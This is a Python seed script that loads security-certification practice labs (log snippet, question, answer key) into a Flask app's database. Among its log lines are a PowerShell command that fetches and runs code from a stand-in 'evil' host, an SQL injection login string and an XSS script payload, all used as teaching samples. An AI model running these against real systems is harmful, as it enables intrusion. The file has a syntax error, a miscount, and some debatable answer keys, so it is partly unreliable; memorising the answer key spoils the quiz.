# seed/seed_lab_data.py
import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from app import create_app
from app.extensions import db
from app.models.lab import LabScenario

app = create_app()

with app.app_context():
    db.drop_all()
    db.create_all()

    labs =     labs = [
        # ─────────────────────────  DOMAIN 1 – ATTACKS & THREATS  ─────────────────────────
        LabScenario(
            title="Phishing Log Investigation",
            log_data="""
Jul 12 10:33:21 mail postfix/smtpd[12345]: connect from unknown[192.168.1.45]
Jul 12 10:33:22 mail postfix/smtpd[12345]: NOQUEUE: reject: RCPT from unknown[192.168.1.45]: 550 5.7.1 Access denied
Jul 12 10:33:23 mail postfix/smtpd[12345]: disconnect from unknown[192.168.1.45]
            """.strip(),
            question="What kind of attack is shown in the log?",
            choices=["Credential Harvesting", "SQL Injection", "Ransomware", "Man-in-the-Middle"],
            answer="Credential Harvesting"
        ),
        LabScenario(
            title="Firewall Log: Port Scan Attempt",
            log_data="IN=eth0 OUT= SRC=192.168.1.200 DST=192.168.1.10 PROTO=TCP SPT=51514 DPT=1",
            question="What is the MOST likely attack type?",
            choices=["Port Scanning", "DDoS", "Buffer Overflow", "Phishing"],
            answer="Port Scanning"
        ),
        LabScenario(
            title="Slowloris DoS Detected",
            log_data="[client 203.0.113.42] partial request received…",
            question="Which DoS technique is being used?",
            choices=["ICMP Flood", "Slowloris", "Smurf", "Ping of Death"],
            answer="Slowloris"
        ),
        LabScenario(
            title="DNS Cache Poisoning Attempt",
            log_data="named[889]: query 'bank.example.com' response has bad signature",
            question="Which control mitigates this attack?",
            choices=["DNSSEC", "802.1X", "WPA3", "NAC"],
            answer="DNSSEC"
        ),
        LabScenario(
            title="Kerberos Golden Ticket Activity",
            log_data="Security-event 4769: RC4-HMAC service ticket requested",
            question="Which post-exploitation technique is indicated?",
            choices=["Pass-the-Hash", "Golden Ticket", "Silver Ticket", "Keylog Injection"],
            answer="Golden Ticket"
        ),
        LabScenario(
            title="Living-off-the-Land PowerShell",
            log_data="IEX (New-Object Net.WebClient).DownloadString('hxxp://evil')",
            question="Which ATT&CK tactic does this represent?",
            choices=["Execution", "Credential Access", "Lateral Movement", "Exfiltration"],
            answer="Execution"
        ),
        LabScenario(
            title="Brute-Force SSH",
            log_data="sshd[2222]: Failed password for root from 10.10.10.10 port 51232",
            question="Which control BEST limits this attack?",
            choices=["Fail2ban", "Disable root", "Port Knock", "VPN"],
            answer="Fail2ban"
        ),
        LabScenario(
            title="ARP Spoofing Detected",
            log_data="arpwatch: changed 10.0.0.5 → 00:11:22:AA:BB:CC",
            question="Which switch feature mitigates this?",
            choices=["Dynamic ARP Inspection", "DHCP Snooping", "Port Security", "BPDU Guard"],
            answer="Dynamic ARP Inspection"
        ),
        LabScenario(
            title="Password Spray Against O365",
            log_data="AzureADSignIn: Failure count for user@corp.com increased to 50",
            question="Which Microsoft control should be enabled?",
            choices=["Smart Lockout", "Conditional Access", "MFA Bypass", "Guest Access"],
            answer="Smart Lockout"
        ),
        LabScenario(
            title="Malware Beacon Over DNS",
            log_data="dns-proxy: query AAAA slksd9e9.badco.xyz from 172.16.5.77",
            question="What C2 technique is suspected?",
            choices=["DNS Tunneling", "TLS Pinning", "Domain Hijacking", "Typosquatting"],
            answer="DNS Tunneling"
        ),

        # ─────────────────────────  DOMAIN 2 – ARCHITECTURE & DESIGN  ────────────────────
        LabScenario(
            title="TLS Certificate Mismatch",
            log_data="chrome: NET::ERR_CERT_COMMON_NAME_INVALID for *.evil.com",
            question="Which concept is violated?",
            choices=["Certificate Pinning", "Key Escrow", "HSTS", "Least Privilege"],
            answer="Certificate Pinning"
        ),
        LabScenario(
            title="Misconfigured S3 Bucket",
            log_data="aws s3api get-bucket-acl --bucket files-public",
            question="Which principle is violated?",
            choices=["Least Privilege", "Separation of Duties", "Fail Closed", "Redundancy"],
            answer="Least Privilege"
        ),
        LabScenario(
            title="Container Escape Hardening",
            log_data="Container started with elevated privileges enabled",
            question="Which configuration change BEST reduces container-escape risk?",
            choices=["Drop unnecessary privileges", "Expose service on all interfaces", "Use latest tag", "Disable TLS"],
            answer="Drop unnecessary privileges"
        ),
        LabScenario(
            title="Secure Baseline – CIS Level 1",
            log_data="/etc/ssh/sshd_config: PermitRootLogin no",
            question="Which security concept is demonstrated?",
            choices=["Configuration Hardening", "Sandboxing", "Data Masking", "Air Gap"],
            answer="Configuration Hardening"
        ),
        LabScenario(
            title="Zero-Trust Segmentation",
            log_data="policy deny-by-default between Finance-NW and Dev-NW",
            question="Which design goal is being applied?",
            choices=["Implicit Deny", "Defense in Depth", "Honey Net", "Least Functionality"],
            answer="Implicit Deny"
        ),
        LabScenario(
            title="OT Network VLAN Plan",
            log_data="PLC-VLAN 20, Historian-VLAN 30, IT-VLAN 99",
            question="Which design concept is illustrated?",
            choices=["Segmentation", "Aggregation", "Taps & SPAN", "NAT64"],
            answer="Segmentation"
        ),

        # ─────────────────────────  DOMAIN 3 – IMPLEMENTATION  ───────────────────────────
        LabScenario(
            title="SQL Injection in Login Form",
            log_data="GET /login.php?user=admin'--",
            question="Which secure coding practice stops this?",
            choices=["Prepared Statements", "WAF Signatures", "Client-side Validation", "Blacklisting"],
            answer="Prepared Statements"
        ),
        LabScenario(
            title="Cross-Site Scripting Payload",
            log_data="comment=<script>alert('XSS')</script>",
            question="Which HTTP response header mitigates this?",
            choices=["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options", "Referrer-Policy"],
            answer="Content-Security-Policy"
        ),
        LabScenario(
            title="LDAP over TLS",
            log_data="389 → 636 STARTTLS successful",
            question="Which port is being used for secure LDAP?",
            choices=["636", "389", "3269", "88"],
            answer="636"
        ),
        LabScenario(
            title="Implementing EAP-TLS",
            log_data="radius: EAP-TLS handshake succeeded",
            question="Which prerequisite is required on clients?",
            choices=["Device Certificate", "Pre-Shared Key", "802.11r", "Captive Portal"],
            answer="Device Certificate"
        ),
        LabScenario(
            title="WPA3 SAE Handshake",
            log_data="hostapd: SAE commit message from 11:22:33:44:55:66",
            question="Which attack does SAE specifically mitigate?",
            choices=["Offline Dictionary", "Evil Twin", "KRACK", "Beacon Flood"],
            answer="Offline Dictionary"
        ),
        LabScenario(
            title="IPsec Transport vs Tunnel",
            log_data="ESP SPI=0x1234 src=10.0.0.1 dst=10.0.0.2",
            question="Which mode is shown in the log?",
            choices=["Transport", "Tunnel", "Aggressive", "Main"],
            answer="Transport"
        ),

        # ─────────────────────────  DOMAIN 4 – OPERATIONS & IR  ──────────────────────────
        LabScenario(
            title="SIEM Correlation – Brute + Lockout",
            log_data="eventID 4625 ×20 for user jsmith followed by 4740",
            question="Which phase of the incident-response process are you in?",
            choices=["Detection & Analysis", "Preparation", "Eradication", "Recovery"],
            answer="Detection & Analysis"
        ),
        LabScenario(
            title="Exfil Over FTP",
            log_data="vsftpd: 5 GB uploaded to 203.0.113.5",
            question="Which control BEST detects this quickly?",
            choices=["DLP", "CASB", "UEBA", "NGFW Geo-IP"],
            answer="DLP"
        ),
        LabScenario(
            title="Ransomware IOC – File Renamed",
            log_data="audit: rename /docs/budget.xls → budget.xls.locky",
            question="What is the FIRST action?",
            choices=["Isolate host", "Pay ransom", "Disable NetBIOS", "Run chkdsk"],
            answer="Isolate host"
        ),
        LabScenario(
            title="Forensic Image Hashing",
            log_data="md5sum image.dd = 098f6bcd4621d373cade4e832627b4f6",
            question="Which principle is being upheld?",
            choices=["Chain of Custody", "Non-repudiation", "Steganography", "Obfuscation"],
            answer="Chain of Custody"
        ),
        LabScenario(
            title="Patch Tuesday Deployment",
            log_data="WSUS: KB5030214 approved for ring-1",
            question="Which change-management step follows approval?",
            choices=["Pilot Testing", "Rollback", "Post-mortem", "Escalation"],
            answer="Pilot Testing"
        ),
        LabScenario(
            title="Backup Verification Failure",
            log_data="veeam: restore session failed – checksum mismatch",
            question="Which control ensures backup INTEGRITY?",
            choices=["Automated Test Restore", "Immutable Storage", "Off-site Tape", "Air Gap"],
            answer="Automated Test Restore"
        ),

        # ─────────────────────────  DOMAIN 5 – GOVERNANCE / RISK  ─────────────────────────
        LabScenario(
            title="Log-Retention Compliance",
            log_data="SIEM retention set to 13 months",
            question="Which framework requires retaining audit logs for at least 12 months?",
            choices=["PCI DSS", "HIPAA", "SOX", "GDPR"],
            answer="PCI DSS"
        ),
        LabScenario(
            title="GDPR Data-Subject Request",
            log_data="Ticket #884: Right to Erasure – user john@eu.example",
            question="Which role is RESPONSIBLE for ensuring compliance?",
            choices=["Data Controller", "Data Processor", "DPO", "Sub-processor"],
            answer="Data Controller"
        ),
        LabScenario(
            title="Risk Register Entry – CVSS 9.8",
            log_data="Item #77: unauthenticated RCE on legacy ERP",
            question="Which response is MOST appropriate?",
            choices=["Mitigate", "Transfer", "Avoid", "Accept"],
            answer="Mitigate"
        ),
        LabScenario(
            title="Audit Report Types",
            log_data="Third-party requests evidence of operational-effectiveness assessment",
            question="Which audit report demonstrates control effectiveness over a period of time?",
            choices=["SOC 2 Type II", "SOC 2 Type I", "PCI DSS RoC", "ISO 27001 Certificate"],
            answer="SOC 2 Type II"
        ),
        LabScenario(
            title="Business Impact Analysis – RTO vs RPO",
            log_data="Payroll app: RTO 4 h, RPO 15 m",
            question="Which metric dictates backup frequency?",
            choices=["RPO", "RTO", "MTTF", "ALE"],
            answer="RPO"
        ),

        # ─────────────────────────  DOMAIN 6 – SECURE PROGRAMMING / DEVOPS  ───────────────
        LabScenario(
            title="Static Code Scan – Hard-coded Key",
            log_data="Secrets-scan: src/config.py line 12 hard-coded AWS key",
            question="Which practice prevents this?",
            choices=["Use Parameter Store", "Telnet Removal", "TLS 1.3", "WAF"],
            answer="Use Parameter Store"
        ),
        LabScenario(
            title="Malicious Package Injection (Supply-Chain)",
            log_data="Build server pulled 'company-common' from public registry",
            question="Which control mitigates this software supply-chain attack?",
            choices=["Private Package Repository", "SBOM", "Code Signing", "Sandbox"],
            answer="Private Package Repository"
        ),
        LabScenario(
            title="Secure Pipeline – Code Scan Blocked",
            log_data="Pipeline security stage failed critical static-analysis checks",
            question="What should happen NEXT?",
            choices=["Block merge/deploy", "Override & deploy", "Open firewall port", "Add to .gitignore"],
            answer="Block merge/deploy"
        ),
        LabScenario(
            title="Dockerfile Exposes Secret",
            log_data="RUN echo 'DB_PASS=admin' >> /root/.bashrc",
            question="Which principle is violated?",
            choices=["Secrets Management", "Immutable Infrastructure", "Idempotency", "Shift Left"],
            answer="Secrets Management"
        ),
        LabScenario(
            title="IaC Plan – Public Cloud Bucket",
            log_data="Planned infrastructure allows public READ on storage bucket",
            question="Which DevSecOps control prevents this?",
            choices=["Policy-as-Code Guardrails", "Blue-Green Deploy", "Canary", "Chaos Engineering"],
            answer="Policy-as-Code Guardrails"
        ),

        # ─────────────────────────  WIRELESS / MOBILE / IOT  ─────────────────────────────
        LabScenario(
            title="Evil Twin AP Detected",
            log_data="WIDS: duplicate SSID 'CorpWiFi' BSSID AA:BB:CC:DD:EE:FF channel 6",
            question="Which IEEE standard helps users detect this?",
            choices=["802.11w PMF", "802.1X", "802.11k", "802.11r"],
            answer="802.11w PMF"
        ),
        LabScenario(
            title="Bluetooth Bluesnarfing",
            log_data="bluetoothd: OBEX push request from 02:11:23:3A:BC:1F",
            question="What data is MOST at risk?",
            choices=["Contacts", "SSID", "IMEI", "GPS"],
            answer="Contacts"
        ),
        LabScenario(
            title="ICS PLC Firmware Tampering",
            log_data="CRC check failed on controller update",
            question="Which security property caught this?",
            choices=["Integrity", "Availability", "Confidentiality", "Authentication"],
            answer="Integrity"
        ),
        LabScenario(
            title="Smart Camera Default Credentials",
            log_data="nmap -p 23 192.0.2.55 → banner: 'root:1234'",
            question="Which best practice mitigates this?",
            choices=["Credential Rotation", "MAC Filtering", "Geo-fencing", "Zigbee"],
            answer="Credential Rotation"
        ),

        # ─────────────────────────  PHYSICAL & SOCIAL  ───────────────────────────────────
        LabScenario(
            title="Badge Reader Tailgating",
            log_data="ACS: Door 3 forced open after authorized badge 123456",
            question="Which control BEST prevents this?",
            choices=["Anti-passback", "HVAC", "Degaussing", "Shunting"],
            answer="Anti-passback"
        ),
        LabScenario(
            title="Dumpster-Diving Evidence",
            log_data="Security camera: individual removing bags from shred bin",
            question="Which policy has been violated?",
            choices=["Media Sanitization", "Data Owner", "Acceptable Use", "BYOD"],
            answer="Media Sanitization"
        ),
        LabScenario(
            title="USB Drop Attack",
            log_data="EDR: new HID keyboard device VID_05AC on Host-HR-23",
            question="Which awareness topic addresses this?",
            choices=["Social Engineering", "Patch Management", "Shadow IT", "Insider Threat"],
            answer="Social Engineering"
        ),
        LabScenario(
            title="Piggybacking at Data Center",
            log_data="CCTV: employee holds door for unknown visitor",
            question="Which type of control mitigates this?",
            choices=["Security Guards", "Bollards", "Faraday Cage", "CCTV only"],
            answer="Security Guards"
        ),

        # ─────────────────────────  CRYPTOGRAPHY  ─────────────────────────────────────────
        LabScenario(
            title="Weak Cipher Suite Negotiated",
            log_data="TLS_RSA_WITH_3DES_EDE_CBC_SHA",
            question="Which action is BEST?",
            choices=["Disable 3DES", "Enable RC4", "Switch to WEP", "Increase key length to 512"],
            answer="Disable 3DES"
        ),
        LabScenario(
            title="Expired Code-Signing Cert",
            log_data="signtool verify /v app.exe → Signer cert expired 2023-12-31",
            question="Which property is lost?",
            choices=["Authenticity", "Confidentiality", "Availability", "Utility"],
            answer="Authenticity"
        ),

        # ─────────────────────────  NETWORK HARDENING  ───────────────────────────────────
        LabScenario(
            title="Default SNMP Community String",
            log_data="snmpwalk -v2c -c public 192.0.2.44 sysDescr",
            question="Which hardening step fixes this?",
            choices=["Change to SNMPv3", "Enable CDP", "Port-mirror", "Disable LLDP"],
            answer="Change to SNMPv3"
        ),
        LabScenario(
            title="Misconfigured NTP",
            log_data="ntpq -p shows stratum 16 (unsynchronised)",
            question="What risk does this pose?",
            choices=["Kerberos Authentication Failure", "ARP Storm", "Jumbo Frame Drop", "RADIUS Loop"],
            answer="Kerberos Authentication Failure"
        ),
        # (count = 52)
    ]


    db.session.add_all(labs)
    db.session.commit()
    print("✅ Lab scenario seeded.")
